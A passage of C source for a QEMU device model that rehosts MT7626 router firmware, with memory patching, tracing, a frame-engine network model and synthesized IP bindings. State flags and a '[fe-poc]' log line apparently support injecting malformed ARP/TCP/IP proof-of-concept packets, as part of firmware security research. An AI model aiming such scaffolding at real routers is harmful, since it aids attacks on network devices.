         * relocated driver blob, which is the surgical NOP target. */
        if (getenv("LEOPARD_BLOB_TRACE")) {
            static int blob_n;
            if (blob_n < 80 &&
                !(pc >= 0x40205000 && pc < 0x40850000) &&
                !(pc >= 0x40000000 && pc < 0x40005000)) {
                fprintf(stderr,
                    "[blob] pc=%#x lr=%#x sp=%#x r0=%#x r1=%#x r2=%#x r3=%#x\n",
                    pc, lr, sp,
                    acpu->env.regs[0], acpu->env.regs[1],
                    acpu->env.regs[2], acpu->env.regs[3]);
                blob_n++;
            }
        }
        /* APP-LIST SURGERY (opt-in via LEOPARD_SKIP_WIFI_APPS=1):
         * skip systool + wlan, whose start handlers dive into the
         * relocated WiFi/mt7626 driver blob and hang (WiFi MCU hardware
         * isn't modeled).  Splice forward.next past systool(0x40732358)
         * and wlan(0x407327c0) to wan(0x40731ef0).  Lets the orchestrator
         * advance through every other AppStart + Phase 1/2, but at the
         * cost of TCP-protocol registration that systool/wlan's
         * non-WiFi parts normally do — incoming SYNs end up at the
         * default IPv4 proto handler (0x40519040) instead of TCP
         * (0x4057a574), so HTTP is unreachable.  Off by default until
         * the missing TCP-registration call is replicated separately.
         * See notes/WIFI_BYPASS_INVESTIGATION.md. */
        {
            static int patched_skip_wifi;
            static int skip_enabled = -1;
            if (skip_enabled < 0) {
                const char *e = getenv("LEOPARD_SKIP_WIFI_APPS");
                skip_enabled = (e && e[0] && e[0] != '0') ? 1 : 0;
            }
            if (skip_enabled && !patched_skip_wifi) {
                uint32_t v = 0;
                cpu_physical_memory_read(0x40732c28, &v, 4);
                if (v == 0x40732358) {
                    uint32_t newv = 0x40731ef0;
                    cpu_physical_memory_write(0x40732c28, &newv, 4);
                    fprintf(stderr,
                        "[applist-surgery] forward.next: %#x -> %#x (skip systool+wlan)\n",
                        v, newv);
                    patched_skip_wifi = 1;
                }
            }
        }
        /* Watch for entry into lanStart / ifconfig_exec. The sampler is
         * coarse-grained (1 ms below) so we only catch them if they
         * loop or block. Also catch by observing LR pointing back into
         * either function. */
        if (!leopard_seen_lanstart &&
            ((pc >= 0x404124b0 && pc < 0x404128ec) ||
             (lr >= 0x404124b0 && lr < 0x404128ec))) {
            fprintf(stderr, "[watch] *** lanStart REACHED  pc=%#x lr=%#x\n", pc, lr);
            leopard_seen_lanstart = true;
        }
        if (!leopard_seen_ifexec &&
            ((pc >= 0x40526d7c && pc < 0x40527c00) ||
             (lr >= 0x40526d7c && lr < 0x40527c00))) {
            fprintf(stderr, "[watch] *** ifconfig_exec REACHED  pc=%#x lr=%#x\n", pc, lr);
            leopard_seen_ifexec = true;
        }

        /* (Injection now done via firmware stub patch — see
         * scripts/patch_inject_lan_ip.py. The stub fires from a real
         * task context inside the PPE-add function, where the lazy
         * semaphore in ifconfig_exec can be safely created.) */
        /* Catch the IO setup writes (run once per op) to learn the
         * MMIO base. After 0x403bf710 (str r2, [r3, #0x718]) we know
         * r3 holds the device struct base. */
        if (pc == 0x403bf710) {
            static int n; if (++n <= 8) {
                uint32_t base = acpu->env.regs[3];
                fprintf(stderr,
                    "[watch] flash IO setup #%d: r3=%#x  (poll@%#x+0x718)\n",
                    n, base, base);
            }
        }
        if (pc >= 0x403fe71c && pc < 0x403fe7f0) {
            static int n;
            if (++n <= 40) {
                uint32_t req = acpu->env.regs[4];
                uint32_t url = req ? leopard_debug_read32(req + 0x50) : 0;
                uint32_t status = req ? leopard_debug_read32(req + 0x10) : 0;
                uint32_t typ = req ? (leopard_debug_read32(req + 0x14) & 0xff) : 0;
                uint8_t host[65] = { 0 };
                if (url) {
                    address_space_read(&address_space_memory, url,
                                       MEMTXATTRS_UNSPECIFIED, host,
                                       sizeof(host) - 1);
                    for (int i = 0; i < (int)sizeof(host) - 1; i++) {
                        if (host[i] < 0x20 || host[i] > 0x7e) {
                            host[i] = 0;
                            break;
                        }
                    }
                }
                fprintf(stderr,
                        "[http-guard] pc=%#x lr=%#x r0=%#x req=%#x "
                        "type=%u status=%#x url=%#x '%s'\n",
                        pc, lr, acpu->env.regs[0], req, typ, status, url,
                        host);
            }
        }
        if (pc == 0x403ff224 || pc == 0x403ff228 || pc == 0x403ff268) {
            static int n;
            if (++n <= 40) {
                uint32_t req = acpu->env.regs[4];
                uint32_t url = req ? leopard_debug_read32(req + 0x50) : 0;
                uint32_t status = req ? leopard_debug_read32(req + 0x10) : 0;
                uint32_t typ = req ? (leopard_debug_read32(req + 0x14) & 0xff) : 0;
                fprintf(stderr,
                        "[http-status-gate] pc=%#x lr=%#x guard_r0=%#x "
                        "req=%#x type=%u status=%#x url=%#x\n",
                        pc, lr, acpu->env.regs[0], req, typ, status, url);
            }
        }
        if (pc == 0x403ff5c0 || pc == 0x403ff5c8 || pc == 0x403ff5fc ||
            pc == 0x403ffce4) {
            static int n;
            if (++n <= 80) {
                uint32_t req = acpu->env.regs[4];
                uint32_t cls = req ? leopard_debug_read32(req + 0x0c) : 0;
                uint32_t status = req ? leopard_debug_read32(req + 0x10) : 0;
                uint32_t table = 0x40666694;
                fprintf(stderr,
                        "[http-class] pc=%#x lr=%#x req=%#x cls=%#x "
                        "status=%#x tbl0.en=%#x tbl0.lport=%#x "
                        "tbl1.en=%#x tbl1.lport=%#x\n",
                        pc, lr, req, cls, status,
                        leopard_debug_read32(table + 0x4c),
                        leopard_debug_read32(table + 0x48),
                        leopard_debug_read32(table + 0x98),
                        leopard_debug_read32(table + 0x94));
            }
        }
    }
    int64_t ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);
    timer_mod(leopard_pc_sample_timer,
              ns + (getenv("LEOPARD_WIFI_FORCE_RX_CONSUMER_AT_WAIT")
                    ? 1000 : 50 * 1000));
}

/* Periodic I/O kick: the RTOS polls UART LSR in a tight loop which can
 * starve QEMU's main-loop I/O processing on TCG.  This timer fires
 * frequently to force QEMU to check chardev backends for new data. */
static QEMUTimer *leopard_io_kick_timer;

static void leopard_io_kick_cb(void *opaque)
{
    /* Reschedule — with icount, this timer callback ensures QEMU
     * exits the execution loop periodically to process I/O events. */
    timer_mod(leopard_io_kick_timer,
              qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL) + 100000); /* 0.1ms */
}

/* ----------------------------------------------------------------------
 * MediaTek MT7626 Frame Engine / PDMA — minimal model
 *
 * Just enough to let firmware bring up the RX/TX rings and exchange
 * frames with QEMU's host network (slirp / -netdev user). Implements
 * the registers documented in the project notes; descriptors follow
 * the MTK PDMA layout (4x32-bit words per descriptor, stride 0x10).
 * --------------------------------------------------------------------*/
#define LEOPARD_FE_BASE        0x1B100000
#define LEOPARD_FE_SIZE        0x6000
#define LEOPARD_FE_IRQ         223  /* firmware passes INTID 0xff = SPI 223 */

#define FE_GDMA1_FWD_CFG       0x500
#define FE_GMAC1_MAC_ADRH      0x508
#define FE_GMAC1_MAC_ADRL      0x50C
/* MTK FE PDMA register layout for this SoC variant: TX block at 0x800,
 * RX block at 0x900.  We had these swapped originally - the firmware's
 * UART log "Tx_Ring addr=X / Rx_Ring addr=Y" plus our [fe] PDMA-enabled
 * trace confirmed which address gets written to which offset.  With the
 * old (wrong) mapping our model treated the firmware's TX ring as RX
 * and delivered packets into TX-ring slots - the firmware's RX scanner
 * never saw any DDONE-set descriptors and the etherPacketAdj path that
 * fired "m_len(0) less than 14" was hitting a different code path. */
#define FE_PDMA_TX0_BASE_PTR   0x800
#define FE_PDMA_TX0_MAX_CNT    0x804
#define FE_PDMA_TX0_CTX_IDX    0x808
#define FE_PDMA_RX0_BASE_PTR   0x900
#define FE_PDMA_RX0_MAX_CNT    0x904
#define FE_PDMA_RX0_CRX_IDX    0x908
#define FE_PDMA_GLO_CFG        0xA04
#define FE_PDMA_RST_IDX        0xA08
#define FE_PDMA_DLY_INT_CFG    0xA0C
#define FE_PDMA_INT_STATUS     0xA20
#define FE_PDMA_INT_MASK       0xA28

#define FE_INT_RX_DONE_INT0    (1u << 30)

#define TYPE_LEOPARD_FE        "leopard-fe"
DECLARE_INSTANCE_CHECKER(LeopardFEState, LEOPARD_FE, TYPE_LEOPARD_FE)

struct LeopardFEState {
    SysBusDevice parent_obj;
    MemoryRegion iomem;
    qemu_irq     irq;
    NICState    *nic;
    NICConf      conf;

    uint32_t gdma1_fwd_cfg;
    uint32_t mac_h;
    uint32_t mac_l;
    uint8_t  peer_mac[6];
    bool     peer_mac_valid;

    uint32_t rx_base;
    uint32_t rx_max;
    uint32_t rx_crx_idx;
    uint32_t rx_drx_idx;       /* HW producer for RX */

    uint32_t tx_base;
    uint32_t tx_max;
    uint32_t tx_ctx_idx;
    uint32_t tx_dtx_idx;       /* HW consumer for TX */

    uint32_t glo_cfg;
    uint32_t dly_int_cfg;
    uint32_t int_mask;
    uint32_t int_status;
    QEMUTimer *rx_delay_timer;
    uint32_t rx_delay_pending_count;
    bool rx_delay_timer_armed;

    bool     enabled_logged;
    bool     bad_arp_injected;
    bool     bad_tcp_injected;
    bool     bad_ip_injected;
    bool     tcp_est_injected;
    bool     tcp_tiny_mss_started;
    bool     tcp_tiny_mss_established;
    bool     tcp_pmtu_low_injected;
    uint32_t tcp_tiny_mss_client_seq;
    uint32_t tcp_tiny_mss_server_seq;
    uint32_t tcp_tiny_mss_server_ack;
    uint32_t tcp_long_fold_base_seq;
    uint32_t tcp_long_fold_sent;
    uint32_t tcp_long_fold_total;
    bool     tcp_long_fold_pregroom_started;
    bool     tcp_long_fold_pregroom_established;
    bool     tcp_long_fold_pregroom_sent;
    bool     tcp_long_fold_pregroom_complete;
    uint32_t tcp_long_fold_pregroom_client_seq;
    uint32_t tcp_long_fold_pregroom_server_seq;
    uint32_t tcp_long_fold_pregroom_server_ack;
    bool     tcp_long_fold_followup_started;
    bool     tcp_long_fold_followup_established;
    bool     tcp_long_fold_followup_sent;
    uint32_t tcp_long_fold_followup_client_seq;
    uint32_t tcp_long_fold_followup_server_seq;
    uint32_t tcp_long_fold_followup_server_ack;

    /* Auto-buffer pool for RX.  The firmware's FE init initializes
     * every RX descriptor to {d0=0, d1=DDONE|LSO=0xc0000000} as a
     * "marked as already-consumed empty placeholder, awaiting per-port
     * driver to post real buffers".  In our model the per-port driver
     * never runs (the production firmware relies on bootloader-stage
     * driver registration we don't replicate), so we substitute by
     * allocating one DRAM buffer per descriptor lazily on first arrival
     * and patching the descriptor ourselves.  This keeps the firmware's
     * GMAC RX / VLAN / bridge / IP stack on the faithful code path -
     * we're only doing what the per-port driver would have done. */
#define LEOPARD_FE_RX_BUF_SIZE  2048
#define LEOPARD_FE_RX_POOL_BASE 0x41E00000   /* 14 MiB into 32 MiB DRAM */
    bool     rx_buf_posted[1024];

    /* Backing store for previously-unhandled FE control registers
     * (PPE block at 0x0E00-0x0EFF and a few neighbours). The firmware
     * polls some of these for ready bits; just returning 0 stalls it.
     * Track value-writes per offset so reads see what the driver
     * stored. */
    uint32_t fe_misc[0x1000 / 4];

    /* Synthetic-TX dedup ring.
     *
     * The firmware-side patches (patch_synthetic_fe_tx_mbuf,
     * patch_mirror_ipv4_output_mbuf) hook the FE driver's mbuf-free
     * wrapper.  Real hardware transmits each packet once (one TX
     * descriptor per packet), but the wrapper is called multiple
     * times per logical packet in this firmware (the mbuf passes
     * through a per-stage chain: link layer free, L3 free, etc., and
     * each stage hits the wrapper).  Without dedup we emit the same
     * frame 3-4 times into slirp; the host stack sees the duplicates
     * but slirp/lwIP-style flow accounting on the firmware side reacts
     * to the implied dup-ACKs / unexpected retransmits, and the TCP
     * sender stalls or closes after one socket-buffer's worth of data
     * (16 KiB) has been "transmitted".
     *
     * We dedup by FNV-1a hash of the entire frame content (folded with
     * the frame length) over a small ring of recently emitted frames.
     * Different segments necessarily differ in TCP seq / payload, so
     * legitimate packets are never collapsed; identical re-emissions
     * within the ring window are dropped before reaching slirp. */
#define LEOPARD_TX_DEDUP_RING 32
    uint64_t tx_dedup_ring[LEOPARD_TX_DEDUP_RING];
    uint32_t tx_dedup_idx;

};

static void leopard_fe_update_irq(LeopardFEState *s);

static void leopard_fe_raise_rx_irq(LeopardFEState *s)
{
    s->rx_delay_pending_count = 0;
    s->rx_delay_timer_armed = false;
    if (s->rx_delay_timer) {
        timer_del(s->rx_delay_timer);
    }
    s->int_status |= FE_INT_RX_DONE_INT0;
    leopard_fe_update_irq(s);
}

static void leopard_fe_rx_delay_timer_cb(void *opaque)
{
    LeopardFEState *s = opaque;

    s->rx_delay_timer_armed = false;
    if (s->rx_delay_pending_count) {
        leopard_fe_raise_rx_irq(s);
    }
}

static void leopard_fe_note_rx_done(LeopardFEState *s)
{
    static unsigned rx_delay_log_count;

    if (!(s->dly_int_cfg & (1u << 15))) {
        if (rx_delay_log_count++ < 32) {
            fprintf(stderr,
                    "[fe] RX delay immediate cfg=%#x pending=%u\n",
                    s->dly_int_cfg, s->rx_delay_pending_count);
        }
        leopard_fe_raise_rx_irq(s);
        return;
    }

    uint32_t packet_threshold = (s->dly_int_cfg >> 8) & 0x7f;
    uint32_t timer_units = s->dly_int_cfg & 0xff;
    const char *threshold_env = getenv("LEOPARD_RX_DELAY_PACKET_THRESHOLD");
    const char *timer_env = getenv("LEOPARD_RX_DELAY_TIMER_UNITS");

    if (threshold_env && *threshold_env) {
        char *end = NULL;
        unsigned long v = strtoul(threshold_env, &end, 0);
        if (end != threshold_env && v <= 0x7f) {
            packet_threshold = v;
        }
    }
    if (timer_env && *timer_env) {
        char *end = NULL;
        unsigned long v = strtoul(timer_env, &end, 0);
        if (end != timer_env && v <= 0xff) {
            timer_units = v;
        }
    }

    if (packet_threshold == 0) {
        packet_threshold = 1;
    }

    s->rx_delay_pending_count++;
    if (rx_delay_log_count++ < 64) {
        fprintf(stderr,
                "[fe] RX delay hold cfg=%#x pending=%u threshold=%u "
                "timer_units=%u\n",
                s->dly_int_cfg, s->rx_delay_pending_count,
                packet_threshold, timer_units);
    }
    if (s->rx_delay_pending_count >= packet_threshold) {
        if (rx_delay_log_count++ < 64) {
            fprintf(stderr, "[fe] RX delay threshold raise pending=%u\n",
                    s->rx_delay_pending_count);
        }
        leopard_fe_raise_rx_irq(s);
        return;
    }

    if (timer_units && s->rx_delay_timer && !s->rx_delay_timer_armed) {
        uint64_t delay_ns = (uint64_t)timer_units * 20 * 1000;
        timer_mod(s->rx_delay_timer,
                  qemu_clock_get_ns(QEMU_CLOCK_HOST) + delay_ns);
        s->rx_delay_timer_armed = true;
    }
}

static uint32_t leopard_fe_rx_sport(void)
{
    const char *env = getenv("LEOPARD_BAD_ARP_SPORT");
    if (!env || !*env) {
        return 1;
    }

    char *end = NULL;
    unsigned long sport = strtoul(env, &end, 0);
    if (end == env || sport > 15) {
        fprintf(stderr, "[fe-poc] invalid LEOPARD_BAD_ARP_SPORT=%s, using 1\n",
                env);
        return 1;
    }
    return (uint32_t)sport;
}

static bool leopard_fe_tx_dedup(LeopardFEState *s,
                                const uint8_t *buf, size_t len)
{
    uint64_t h = 0xcbf29ce484222325ULL;       /* FNV-1a 64-bit offset */
    for (size_t i = 0; i < len; i++) {
        h ^= buf[i];
        h *= 0x100000001b3ULL;
    }
    /* Fold length to distinguish prefix-equal frames of different sizes. */
    h ^= (uint64_t)len << 1;

    for (int i = 0; i < LEOPARD_TX_DEDUP_RING; i++) {
        if (s->tx_dedup_ring[i] == h) {
            return true;
        }
    }
    s->tx_dedup_ring[s->tx_dedup_idx] = h;
    s->tx_dedup_idx = (s->tx_dedup_idx + 1) % LEOPARD_TX_DEDUP_RING;
    return false;
}

static void leopard_fe_update_irq(LeopardFEState *s)
{
    static int n;
    int level = (s->int_status & s->int_mask) ? 1 : 0;
    if (n++ < 16) {
        fprintf(stderr, "[fe] update_irq level=%d status=%#x mask=%#x\n",
                level, s->int_status, s->int_mask);
    }
    qemu_set_irq(s->irq, level);
}

static hwaddr leopard_fe_dma_addr(uint32_t reg)
{
    /* Firmware writes (phys & 0x1fffffff) | 0x40000000. Strip flag bits
     * and OR back DRAM base. */
    return ((hwaddr)(reg & 0x1fffffffu)) | LEOPARD_DRAM_BASE;
}

static uint32_t leopard_debug_read32(uint32_t addr)
{
    uint32_t v = 0;
    address_space_read(&address_space_memory, addr, MEMTXATTRS_UNSPECIFIED,
                       &v, sizeof(v));
    return le32_to_cpu(v);
}

static uint8_t leopard_debug_read8(uint32_t addr)
{
    uint8_t v = 0;
    address_space_read(&address_space_memory, addr, MEMTXATTRS_UNSPECIFIED,
                       &v, sizeof(v));
    return v;
}

static void leopard_debug_write8(uint32_t addr, uint8_t val)
{
    address_space_write(&address_space_memory, addr, MEMTXATTRS_UNSPECIFIED,
                        &val, sizeof(val));
}

static void leopard_debug_write32(uint32_t addr, uint32_t val)
{
    uint32_t v = cpu_to_le32(val);
    address_space_write(&address_space_memory, addr, MEMTXATTRS_UNSPECIFIED,
                        &v, sizeof(v));
}

static hwaddr leopard_dram_ptr(uint32_t p)
{
    if (p >= LEOPARD_DRAM_BASE && p < LEOPARD_DRAM_BASE + LEOPARD_DRAM_SIZE) {
        return p;
    }
    return leopard_fe_dma_addr(p);
}

static void leopard_fe_get_fw_mac(LeopardFEState *s, uint8_t fw_mac[6])
{
    uint32_t adrh = s->mac_l;
    uint32_t adrl = s->mac_h;

    fw_mac[0] = (adrh >> 8) & 0xff;
    fw_mac[1] = (adrh >> 0) & 0xff;
    fw_mac[2] = (adrl >> 24) & 0xff;
    fw_mac[3] = (adrl >> 16) & 0xff;
    fw_mac[4] = (adrl >> 8) & 0xff;
    fw_mac[5] = (adrl >> 0) & 0xff;
}

static uint32_t leopard_fe_guest_ip_host(void);
static bool leopard_fe_maybe_reply_host_arp(LeopardFEState *s,
                                            const uint8_t *buf,
                                            size_t len);

static bool leopard_fe_get_rx_accept_mac(uint8_t mac[6])
{
    uint32_t ifp = 0x4065cf54;
    uint32_t port_word = leopard_debug_read32(ifp + 0x24);
    uint32_t port_index = port_word - 0xc0000001u;
    uint32_t port_table_root = leopard_debug_read32(0x4071c4c8);
    uint32_t slot, port_entry, mac_off, mac_base;

    if (!port_table_root) {
        return false;
    }
    slot = leopard_debug_read32(port_table_root + port_index * 4);
    port_entry = slot ? leopard_debug_read32(slot) : 0;
    if (!port_entry) {
        return false;
    }
    mac_off = leopard_debug_read8(port_entry + 5);
    mac_base = port_entry + 8 + mac_off;
    if (mac_base < 0x40000000 || mac_base >= 0x42000000) {
        return false;
    }
    address_space_read(&address_space_memory, (hwaddr)mac_base,
                       MEMTXATTRS_UNSPECIFIED, mac, 6);
    return true;
}

static void leopard_fe_seed_ip_class_ctx_for(uint32_t ctx)
{
    uint32_t helper = 0x4071e6c0;
    uint32_t l4 = leopard_debug_read32(helper + 0x0c);
    uint32_t data = leopard_debug_read32(helper + 0x08);
    uint32_t ip_len, dst_ip, src_ip;
    uint16_t dst_port;

    if (!getenv("LEOPARD_FE_SEED_IP_CLASS_CTX")) {
        return;
    }
    if (ctx < 0x40000000 || ctx >= 0x42000000 ||
        l4 < 0x40000000 || l4 >= 0x42000000 ||
        data < 0x40000000 || data >= 0x42000000) {
        return;
    }
    if (leopard_debug_read8(data + 9) != 6) {
        return;
    }
    ip_len = ((uint32_t)leopard_debug_read8(data + 2) << 8) |
             leopard_debug_read8(data + 3);
    dst_ip = leopard_debug_read32(data + 16);
    src_ip = leopard_debug_read32(data + 12);
    dst_port = leopard_debug_read8(l4 + 2) << 8 | leopard_debug_read8(l4 + 3);
    if (dst_ip == leopard_fe_guest_ip_host() && dst_port == 80 &&
        ip_len >= 40 && leopard_debug_read32(ctx + 0x34) == 0) {
        /*
         * Diagnostic: WLAN/full-app boot creates a route/class context for
         * slirp-originated TCP/80 but leaves the direction-specific subcontext
         * pointer empty.  Reuse the active local-delivery subcontext observed in
         * lifecycle traffic so we can determine whether TCP is otherwise viable.
         */
        leopard_debug_write32(ctx + 0x34, 0x412439b4);
        fprintf(stderr,
                "[ip-class-fix] seeded ctx=%#x +0x34 := 0x412439b4 "
                "src=%#x dst=%#x ip_len=%u\n",
                ctx, src_ip, dst_ip, ip_len);
    }
}

static void leopard_fe_seed_ip_class_ctx(void)
{
    leopard_fe_seed_ip_class_ctx_for(leopard_debug_read32(0x4071e6c0 + 0x04));
}

static uint16_t leopard_get_be16(const uint8_t *p)
{
    return ((uint16_t)p[0] << 8) | p[1];
}

static uint32_t leopard_get_be32(const uint8_t *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | p[3];
}

static uint32_t leopard_fe_guest_ip_be(void)
{
    const char *env = getenv("LEOPARD_FE_GUEST_IP");
    unsigned a, b, c, d;
    char tail;

    if (env && sscanf(env, "%u.%u.%u.%u%c", &a, &b, &c, &d, &tail) == 4 &&
        a <= 255 && b <= 255 && c <= 255 && d <= 255) {
        return (a << 24) | (b << 16) | (c << 8) | d;
    }

    return (192u << 24) | (168u << 16) | (0u << 8) | 1u;
}

static uint32_t leopard_fe_guest_ip_host(void)
{
    uint32_t ip = leopard_fe_guest_ip_be();

    return ((ip & 0xff) << 24) | ((ip & 0xff00) << 8) |
           ((ip >> 8) & 0xff00) | ((ip >> 24) & 0xff);
}

static bool leopard_fe_prepare_rx_accept_mac_frame(LeopardFEState *s,
                                                   const uint8_t *buf,
                                                   size_t size,
                                                   uint8_t *frame,
                                                   size_t frame_cap)
{
    static unsigned rewrite_logs;
    uint8_t accept_mac[6];
    uint32_t dst_ip;

    if (size > frame_cap || size < 34) {
        return false;
    }
    if (buf[12] != 0x08 || buf[13] != 0x00) {
        return false;
    }
    if ((buf[14] >> 4) != 4) {
        return false;
    }

    dst_ip = leopard_get_be32(buf + 30);
    if (dst_ip != leopard_fe_guest_ip_be()) {
        return false;
    }
    if (!leopard_fe_get_rx_accept_mac(accept_mac)) {
        return false;
    }
    if (memcmp(buf, accept_mac, sizeof(accept_mac)) == 0) {
        return false;
    }

    memcpy(frame, buf, size);
    memcpy(frame, accept_mac, sizeof(accept_mac));

    if (rewrite_logs < 16) {
        fprintf(stderr,
                "[fe] RX DA rewrite for guest IP: "
                "%02x:%02x:%02x:%02x:%02x:%02x -> "
                "%02x:%02x:%02x:%02x:%02x:%02x type=%02x%02x\n",
                buf[0], buf[1], buf[2], buf[3], buf[4], buf[5],
                accept_mac[0], accept_mac[1], accept_mac[2],
                accept_mac[3], accept_mac[4], accept_mac[5],
                buf[12], buf[13]);
        rewrite_logs++;
    }
    (void)s;
    return true;
}

static uint16_t leopard_fold_checksum(uint32_t sum)
{
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum;
}

static uint16_t leopard_ip_checksum(const uint8_t *ip, size_t ihl)
{
    uint32_t sum = 0;
    for (size_t i = 0; i + 1 < ihl; i += 2) {
        if (i == 10) {
            continue;
        }
        sum += leopard_get_be16(ip + i);
    }
    return leopard_fold_checksum(sum);
}

static uint16_t leopard_tcp_checksum(const uint8_t *ip, size_t ip_len)
{
    uint8_t ihl = (ip[0] & 0x0f) * 4;
    uint16_t tcp_len;
    uint32_t sum = 0;

    if (ip_len < ihl || ip[9] != 6) {
        return 0;
    }
    tcp_len = ip_len - ihl;
    for (int i = 12; i < 20; i += 2) {
        sum += leopard_get_be16(ip + i);
    }
    sum += ip[9];
    sum += tcp_len;
    for (uint16_t i = 0; i < tcp_len; i += 2) {
        if (i == 16) {
            continue;
        }
        if (i + 1 < tcp_len) {
            sum += leopard_get_be16(ip + ihl + i);
        } else {
            sum += (uint16_t)ip[ihl + i] << 8;
        }
    }
    return leopard_fold_checksum(sum);
}

static void leopard_fix_ipv4_checksums(uint8_t *ip, size_t len)
{
    uint8_t ihl;
    uint16_t csum;

    if (len < 20 || (ip[0] >> 4) != 4) {
        return;
    }
    ihl = (ip[0] & 0x0f) * 4;
    if (ihl < 20 || len < ihl) {
        return;
    }
    ip[10] = 0;
    ip[11] = 0;
    csum = leopard_ip_checksum(ip, ihl);
    ip[10] = csum >> 8;
    ip[11] = csum & 0xff;
    if (ip[9] == 6 && len >= ihl + 20) {
        uint8_t *tcp = ip + ihl;
        tcp[16] = 0;
        tcp[17] = 0;
        csum = leopard_tcp_checksum(ip, len);
        tcp[16] = csum >> 8;
        tcp[17] = csum & 0xff;
    }
}

static void leopard_fe_ensure_ipv4_binding(void)
{
    enum {
        FAKE_IF_ROOT = 0x405b5a80,
        FAKE_ADDR_NODE = 0x405b5b00,
        FAKE_SOCKADDR = 0x405b5b80,
        /*
         * The ARP handler receives the real eth0 ifnet at this address in the
         * synthetic boot used by these probes. Its reply path selects local
         * IPv4 addresses by walking ifp+0x10, not the cfg root used by IPv4.
         */
        FAKE_ARP_IFP = 0x4065cf54,
    };
    uint32_t cfg = leopard_debug_read32(0x4071e6c0);
    uint32_t guest_ip = leopard_fe_guest_ip_host();
    uint32_t if_root, old_addr_node;
    /*
     * The web stack independently classifies accepted sockets as local
     * vs remote management by testing the peer address against this LAN
     * address global and the firmware's mask at 0x40689490.  Do not write
     * 0x40689490 here; in the ARP path it is also used as a callback/list
     * slot, and poisoning it with a netmask crashes tNetTask.
     */
    leopard_debug_write32(0x40689488, guest_ip);
    if (!cfg) {
        leopard_debug_write32(0x4066bb28, 0);
        return;
    }

    if_root = leopard_debug_read32(cfg + 0x18);
    old_addr_node = if_root ? leopard_debug_read32(if_root + 0x10) : 0;
    for (int i = 0; old_addr_node && i < 16; i++) {
        uint32_t sockaddr = leopard_debug_read32(old_addr_node + 0x00);
        uint32_t next = leopard_debug_read32(old_addr_node + 0x60);
        uint32_t family_word = sockaddr ? leopard_debug_read32(sockaddr) : 0;
        uint32_t ip = sockaddr ? leopard_debug_read32(sockaddr + 0x04) : 0;

        if (((family_word >> 8) & 0xff) == 2 && ip == guest_ip) {
            leopard_debug_write32(0x4066bb28, 0);
            return;
        }
        if (next == old_addr_node) {
            break;
        }
        old_addr_node = next;
    }

    /*
     * IP input walks (*(cfg+0x18)+0x10) as an in_ifaddr-style list:
     *   node[0]   -> sockaddr, byte 1 is AF_INET (2)
     *   node[2]   must be non-zero
     *   sockaddr+4 holds the IPv4 address as a host-endian u32
     *   node[0x18] is the next pointer
     * Populate only those fields so the real IP/TCP path sees
     * the configured guest IP as a local address.
     */
    if (!if_root) {
        if_root = FAKE_IF_ROOT;
        leopard_debug_write32(cfg + 0x18, FAKE_IF_ROOT);
        leopard_debug_write32(FAKE_IF_ROOT + 0x2c, 0);
    }
    old_addr_node = leopard_debug_read32(if_root + 0x10);
    /*
     * ARP's reply path walks ifp+0x10 directly, while IPv4 input walks
     * (*(cfg+0x18)+0x10). Populate both views for synthetic interface tests.
     */
    leopard_debug_write32(cfg + 0x10, FAKE_ADDR_NODE);
    leopard_debug_write32(if_root + 0x10, FAKE_ADDR_NODE);
    leopard_debug_write32(FAKE_ARP_IFP + 0x10, FAKE_ADDR_NODE);
    leopard_debug_write32(FAKE_ADDR_NODE + 0x00, FAKE_SOCKADDR);
    leopard_debug_write32(FAKE_ADDR_NODE + 0x08, FAKE_ARP_IFP);
    leopard_debug_write32(FAKE_ADDR_NODE + 0x18, old_addr_node);
    leopard_debug_write32(FAKE_ADDR_NODE + 0x5c, FAKE_ARP_IFP);
    leopard_debug_write32(FAKE_ADDR_NODE + 0x60, old_addr_node);
    leopard_debug_write32(FAKE_ADDR_NODE + 0xa4, guest_ip);
    leopard_debug_write32(FAKE_SOCKADDR + 0x00, 0x00000200);
    leopard_debug_write32(FAKE_SOCKADDR + 0x04, guest_ip);
    leopard_debug_write32(0x4066bb28, 0);
    fprintf(stderr,
            "[ip-bind] synthesized AF_INET %u.%u.%u.%u root=%#x node=%#x\n",
            guest_ip & 0xff, (guest_ip >> 8) & 0xff,
            (guest_ip >> 16) & 0xff, (guest_ip >> 24) & 0xff,
            FAKE_IF_ROOT, FAKE_ADDR_NODE);
}

static void leopard_fe_dump_ipv4_bindings(void)
{
    uint32_t cfg = leopard_debug_read32(0x4071e6c0);
    uint32_t if_root = cfg ? leopard_debug_read32(cfg + 0x18) : 0;
    uint32_t addr_node = if_root ? leopard_debug_read32(if_root + 0x10) : 0;

    fprintf(stderr,
            "[ip-bind] *4071e6c0=%#x if_root=%#x addr_list=%#x\n",
            cfg, if_root, addr_node);

    for (int i = 0; addr_node && i < 12; i++) {
        uint32_t sockaddr = leopard_debug_read32(addr_node + 0x00);
        uint32_t ifp = leopard_debug_read32(addr_node + 0x08);
        uint32_t next = leopard_debug_read32(addr_node + 0x60);
        uint32_t family_word = sockaddr ? leopard_debug_read32(sockaddr) : 0;
        uint32_t ip = sockaddr ? leopard_debug_read32(sockaddr + 0x04) : 0;

        fprintf(stderr,
                "[ip-bind] node[%d]=%#x sockaddr=%#x family_word=%#x "
                "ip=%u.%u.%u.%u raw=%#x ifp=%#x next=%#x\n",
                i, addr_node, sockaddr, family_word,
                ip & 0xff, (ip >> 8) & 0xff, (ip >> 16) & 0xff,
                (ip >> 24) & 0xff, ip, ifp, next);
        addr_node = next;
    }
}

/* Read a 16-byte PDMA descriptor (4 LE words). */
static void leopard_fe_read_desc(hwaddr base, unsigned idx, uint32_t d[4])
{
    hwaddr a = base + (hwaddr)idx * 0x10;
    for (int i = 0; i < 4; i++) {
        uint32_t w = 0;
        address_space_read(&address_space_memory, a + i * 4,
                           MEMTXATTRS_UNSPECIFIED, &w, 4);
        d[i] = le32_to_cpu(w);
    }
}

static void leopard_fe_write_desc(hwaddr base, unsigned idx, const uint32_t d[4])
{
    hwaddr a = base + (hwaddr)idx * 0x10;
    for (int i = 0; i < 4; i++) {
        uint32_t w = cpu_to_le32(d[i]);
        address_space_write(&address_space_memory, a + i * 4,
                            MEMTXATTRS_UNSPECIFIED, &w, 4);
    }
}

/* Flush any pending TX descriptors from dtx_idx up to ctx_idx. */
static void leopard_fe_kick_tx(LeopardFEState *s)
{
